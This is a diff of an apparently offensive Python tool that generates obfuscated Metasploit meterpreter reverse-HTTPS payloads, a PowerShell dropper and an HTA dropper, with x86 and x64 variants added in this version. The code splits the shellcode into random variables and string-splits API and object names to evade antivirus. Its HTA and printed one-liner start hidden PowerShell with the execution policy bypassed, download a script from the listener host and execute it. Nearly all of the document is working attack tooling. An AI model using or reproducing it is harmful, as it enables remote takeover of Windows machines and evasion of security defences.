@@ -2,43 +2,50 @@
 # shellcode replacement script py-version
 # meterpreter PSH-NET payload: generation + obfuscation
 # meterpreter HTA payload: generation + obfuscation
-# darksh3llRU v1.0
+# darksh3llRU v1.1
+# April 2021, added x86 and x64 payloads into hta dropper (adjusted for ARCH based payload selection), other changes (obfuscation, functions)
 
-import inquirer
-import ipaddress
-import validators
-import subprocess
-import re
-import base64
-import random
-import string
+import os, inquirer, ipaddress, validators, subprocess, re, base64, random, string
 
 # Default values
 defListenerIP = '192.168.88.19'
 defListenerPort=8443
-defListenerURI='/logout'
+defListenerURI_x64='/logout'
+defListenerURI_x86='/signout'
 defProxyType='HTTP'
 defProxyHost=''
 defProxyPort=''
 defProxyUser=''
 defProxyPass=''
 defUserAgent ='Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko'
-defDownloadURL='http://192.168.88.19:8080/'
+defDownloadURL='http://192.168.88.19/'
 
-# Payload type selection
+# Payload selection
 def msfpayload_select():
     options = [
     inquirer.List('choice',
-                message="Which payload would you like to use?",
+                message="Select 'x64' staged or stageless meterpreter reverse https:",
                 choices=['windows/x64/meterpreter_reverse_https', 'windows/x64/meterpreter/reverse_https'],
             ),
     ]
     selection = inquirer.prompt(options)
-    payload = selection["choice"]
-    return payload
+    payload_x64 = selection["choice"]
+    options = [
+        inquirer.List('choice',
+                message="Select 'x86' staged or stageless meterpreter reverse https :",
+                choices=['windows/meterpreter_reverse_https', 'windows/meterpreter/reverse_https'],
+            ),
+    ]
+    selection = inquirer.prompt(options)
+    payload_x86 = selection["choice"]
+    return payload_x64, payload_x86
 
 # Payload options input
-def msfpayload_options_set():
+def msfpayload_options_set(payload):
+    if "x64" in payload:
+        defListenerURI = defListenerURI_x64
+    else:
+        defListenerURI = defListenerURI_x86
     print("Default payload options:\n" + "ListenerIP: " + defListenerIP + "\n" + "ListenerPort: " + str(defListenerPort) + "\n" + "ListenerURI: " + defListenerURI + "\n")
     print("Default payload proxy options:\n" + "ProxyType: " + defProxyType + "\n" + "ProxyHost: " + defProxyHost + "\n" + "ProxyPort: " + str(defProxyPort) + "\n", end = '')
     print("ProxyUser: " + defProxyUser + "\n" + "ProxyPass: " + defProxyPass + "\n")
@@ -105,11 +112,12 @@ def msfpayload_options_set():
         DownloadURL = defDownloadURL
     payload_options = ("LHOST=" + str(ListenerIP) + " LPORT=" + str(ListenerPort) + " LURI=" + str(ListenerURI) + " HttpUserAgent='" + str(UserAgent)
                        + "'" + " OverrideLHOST=" + str(ListenerIP) + " OverrideLPORT=" + str(ListenerPort) + " OverrideRequestHost=true")
-    return payload_options, UserAgent, DownloadURL
+    dropper_filename = str(ListenerIP) + "-" + str(ListenerPort) + "-" + str(ListenerURI).strip("/") + ".ps1"
+    return payload_options, UserAgent, DownloadURL, dropper_filename
 
-def generate_raw_payload(payload_type, payload_options, DownloadURL, UserAgent):
-    print("Default dropper filename: pshnet_revhttps.ps1")
-    payload_filename = str(input("Enter filename with extension ps1: ") or "pshnet_revhttps.ps1")
+def generate_raw_payload(payload_type, payload_options, DownloadURL, UserAgent, dropper_filename):
+    print("Default dropper filename: " + str(dropper_filename))
+    payload_filename = str(input("Enter filename with extension ps1: ") or str(dropper_filename))
     args = "msfvenom -p " + payload_type +" " + payload_options + " -f psh-net -o " + payload_filename
     print("Generating meterpreter payload with msfvenom...")
     subprocess.run(args, shell=True, stdout=subprocess.DEVNULL)
@@ -166,10 +174,11 @@ def change_payload(payload_filename):
 
     with open(payload_filename, 'r+') as raw_file:
         sc_concat = ""
+        payloadchunkname = "$" + junk_string(10)
         contents = raw_file.readlines()
         for i in range(len(shellcode_chunks)):
-            contents.insert(line_num, '$bisous' + str(i) + '="' + str(shellcode_chunks[i]) + '"\n\n\n')
-            sc_concat += "$bisous" + str(i) + "+"
+            contents.insert(line_num, payloadchunkname + str(i) + '="' + str(shellcode_chunks[i]) + '"\n\n\n')
+            sc_concat += payloadchunkname + str(i) + "+"
         sc_concat = sc_concat[:-1]
         raw_file.seek(0)
         raw_file.writelines(contents)
@@ -177,7 +186,7 @@ def change_payload(payload_filename):
     with open (payload_filename, "rt") as raw_file:
         stager = raw_file.read()
     raw_file = open(payload_filename, "wt")
-    stager = stager.replace('"'+raw_base64+'"', sc_concat)
+    stager = stager.replace('"'+ raw_base64 +'"', sc_concat)
     stager = stager.replace('kernel32.dll', 'ke"+"rn"+"e"+"l"+"32."+"d"+"l"+"l')
     raw_file.write(stager)
     print("PSH-NET Dropper " + payload_filename + " has been updated")
@@ -202,7 +211,7 @@ def obfuscate_payload(payload_filename):
                 contents.insert(i,"#" + junk_string(512) + "\n")
             raw_file.seek(0)
             raw_file.writelines(contents)
-            print("Dropper " +payload_filename + " obfuscation done.")
+            print("Dropper " + payload_filename + " obfuscation done.")
     else:
         print("Proceeding without dropper obfuscation...")
         
@@ -213,44 +222,80 @@ def junk_string(length):
     junk = ''.join(random.choice(letters) for i in range(length))
     return junk
 
-def generate_hta(DownloadURL, UserAgent, payload_filename):
-    print("Preparing HTA dropper...\nDefault HTA filename: user_settings.hta")
-    hta_filename = str(input("Enter filename with extension hta: ") or "user_settings.hta")
-    var1 = "$"+junk_string(8); var2 = "$"+junk_string(8); var3 = "$"+junk_string(8); var4 = junk_string(8); var5 = junk_string(8)
-    hta_stager = ("""if([IntPtr]::Size -eq 4){""" + var1 + """=$env:windir+'\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe'}else{"""
-                 + var1 + """='powershell.exe'};""" + var2 + """=New-Object System.Diagnostics.ProcessStartInfo;""" + var2 + """.FileName="""
+def generate_hta_stager(payload_filename):
+    var1 = "$"+junk_string(8); var2 = "$"+junk_string(8); var3 = "$"+junk_string(8)
+    hta_stager = ("""if([IntPtr]::Size -eq 4){""" + var1 + """='powershell.exe'}else{"""
+                 + var1 + """=$env:windir+'\\system32\\WindowsPowerShell\\v1.0\\powershell.exe'};""" + var2 + """=New-Object System.Diagnostics.ProcessStartInfo;""" + var2 + """.FileName="""
                  + var1 + """;""" + var2 + """.Arguments="[System.Net.WebRequest]::DefaultWebProxy=[System.Net.WebRequest]::GetSystemWebProxy();"""
                  """[System.Net.WebRequest]::DefaultWebProxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;IWR """
                  + DownloadURL + payload_filename + """ -UserAgent '""" + UserAgent + """'|IEX";""" + var2 + """.UseShellExecute=$false;"""
                  + var2 + """.RedirectStandardOutput=$false;""" + var2 + """.WindowStyle='Hidden';""" + var2 + """.CreateNoWindow=$false;"""
                  + var3 + """=[System.Diagnostics.Process]::Start(""" + var2 + """);""")
     hta_base64 = str(base64.b64encode(bytes(hta_stager, 'utf-16le')))[2:][:-1]
+    return hta_base64
+
+def generate_hta(DownloadURL, UserAgent, payload_filename_x64, payload_filename_x86):
+    def_hta_filename = os.path.commonprefix([payload_filename_x64,payload_filename_x86])[:-1]
+    if def_hta_filename == "":
+        def_hta_filename = 'account_settings.hta'
+    else:
+        pass
+    print("Preparing HTA dropper...\nDefault HTA filename: " + def_hta_filename + ".hta")
+    hta_filename = str(input("Enter filename with extension hta: ") or def_hta_filename + ".hta")
+    hta_base64_x64 = generate_hta_stager(payload_filename_x64)
+    hta_base64_x86 = generate_hta_stager(payload_filename_x86)
+    var4 = junk_string(8); var5 = junk_string(8)
     hta_template = ("""<script language="VBScript">
-  window.moveTo -4000, -4000
-  Set {var4} = CreateObject("Wscript.Shell")
-  Set {var5} = CreateObject("Scripting.FileSystemObject")
-  For each path in Split({var4}.ExpandEnvironmentStrings("%PSModulePath%"),";")
-    If {var5}.FileExists(path + "\\..\\powershell.exe") Then
-      {var4}.Run "powershell.exe -nop -w hidden -Exec Bypass -e {hta_base64}",0
+  window.moveTo -1337, -1337
+  Set {var4} = CreateObject("Wsc"+"ri"+"pt.S"+"hell")
+  Set {var5} = CreateObject("Sc"+"rip"+"tin"+"g.F"+"ile"+"S"+"ys"+"temO"+"bje"+"ct")
+  For each data in Split({var4}.ExpandEnvironmentStrings("%P"+"at"+"h%"),";")
+    If {var5}.FileExists(data + "\\po"+"wer"+"sh"+"el"+"l.e"+"xe") Then
+        If inStr(1,data,"sy"+"s"+"te"+"m32",1) Then
+            If  inStr(1,{var4}.ExpandEnvironmentStrings("%ProgramW6432%"),"%",1) Then
+                {var4}.Run "powershell.exe -nop -w hidden -Exec Bypass -e {hta_base64_x86}",0
+            Else
+                {var4}.Run "powershell.exe -nop -w hidden -Exec Bypass -e {hta_base64_x64}",0
+            End If
+        Else
+            '{var4}.Run "powershell.exe -nop -w hidden -Exec Bypass -e {hta_base64_x86}",0
+        End If
       Exit For
     End If
   Next
   window.close()
 </script>
 """)
-    hta_parameters = {"hta_base64":hta_base64, "var4":var4, "var5":var5}
+    hta_parameters = {"hta_base64_x64":hta_base64_x64, "hta_base64_x86":hta_base64_x86, "var4":var4, "var5":var5}
     with open(hta_filename, 'wt') as hta_file:
         hta_file.write(hta_template.format(**hta_parameters))
     print("HTA dropper saved as " + hta_filename)
     return hta_filename
-                  
-if __name__=='__main__':
-    payload = msfpayload_select()
-    payload_options, UserAgent, DownloadURL = msfpayload_options_set()
-    payload_filename = generate_raw_payload(payload, payload_options, DownloadURL, UserAgent)
-    change_payload(payload_filename)
-    obfuscate_payload(payload_filename)
+
+def print_ps_usage(DownloadURL, payload_filename, UserAgent):
     print("""PSH-NET dropper usage example:\npowershell.exe -Window Hidden -Nop -Exec Bypass -C "[System.Net.WebRequest]::DefaultWebProxy=[System.Net.WebRequest]::GetSystemWebProxy();""", end = '')
     print("""[System.Net.WebRequest]::DefaultWebProxy.Credentials=[System.Net.CredentialCache]::DefaultNetworkCredentials;IWR('""", end = '')
     print(DownloadURL + payload_filename + """') -UserAgent '""" + UserAgent + """'|IEX" """)
-    generate_hta(DownloadURL, UserAgent, payload_filename)
+    return 1
+                  
+if __name__=='__main__':
+    print("!!!!!!!!!!!!!!!!!!!! Review default script values !!!!!!!!!!!!!!!!!!!!")
+    payload_x64, payload_x86 = msfpayload_select()
+
+    print("!!!!!!!!!!!!!!!!!!!! Working with x64 payload !!!!!!!!!!!!!!!!!!!!")
+    payload_options, UserAgent, DownloadURL, dropper_filename = msfpayload_options_set(payload_x64)
+    payload_filename = generate_raw_payload(payload_x64, payload_options, DownloadURL, UserAgent, dropper_filename)
+    change_payload(payload_filename)
+    payload_filename_x64 = obfuscate_payload(payload_filename)
+    print_ps_usage(DownloadURL, payload_filename_x64, UserAgent)
+
+    print("!!!!!!!!!!!!!!!!!!!! Working with x86 payload !!!!!!!!!!!!!!!!!!!!")
+    payload_options, UserAgent, DownloadURL, dropper_filename = msfpayload_options_set(payload_x86)
+    payload_filename = generate_raw_payload(payload_x86, payload_options, DownloadURL, UserAgent, dropper_filename)
+    change_payload(payload_filename)
+    payload_filename_x86 = obfuscate_payload(payload_filename)
+    print_ps_usage(DownloadURL, payload_filename_x86, UserAgent)
+
+    print("!!!!!!!!!!!!!!!!!!!! Generating HTA !!!!!!!!!!!!!!!!!!!!")
+    generate_hta(DownloadURL, UserAgent, payload_filename_x64, payload_filename_x86)
+    print("!!!!!!!!!!!!!!!!!!!! Script execution finished !!!!!!!!!!!!!!!!!!!!")
